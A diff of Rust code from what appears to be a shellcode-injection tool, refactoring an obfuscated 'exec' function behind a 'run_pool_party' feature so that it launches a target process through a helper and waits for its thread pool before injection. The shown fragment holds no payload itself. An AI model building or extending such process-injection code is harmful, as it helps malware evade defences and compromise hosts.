@@ -8,31 +8,7 @@ use obfstr::obfstr;
 
 #[cfg(feature = "run_pool_party")]
 pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &str) -> Result<(), String> {
-    use std::ffi::CString;
-    use windows_sys::Win32::System::Threading::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA};
-    use windows_sys::Win32::Foundation::{GetLastError, FALSE};
-    
-    let mut startup_info: STARTUPINFOA = std::mem::zeroed();
-    let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
-    startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
-
-    let app_name = CString::new(target_program).unwrap();
-    let success = CreateProcessA(
-        std::ptr::null(),
-        app_name.as_ptr() as *mut u8,
-        std::ptr::null(),
-        std::ptr::null(),
-        FALSE,
-        0, 
-        std::ptr::null(),
-        std::ptr::null(),
-        &mut startup_info,
-        &mut process_info,
-    );
-
-    if success == FALSE {
-        return Err(format!("CreateProcessA failed: {}", GetLastError()));
-    }
+    let process_info = crate::utils::remote::create_process(target_program, 0)?;
 
     // Wait for process to initialize thread pool
     crate::api::delay_execution_seconds(2)?;
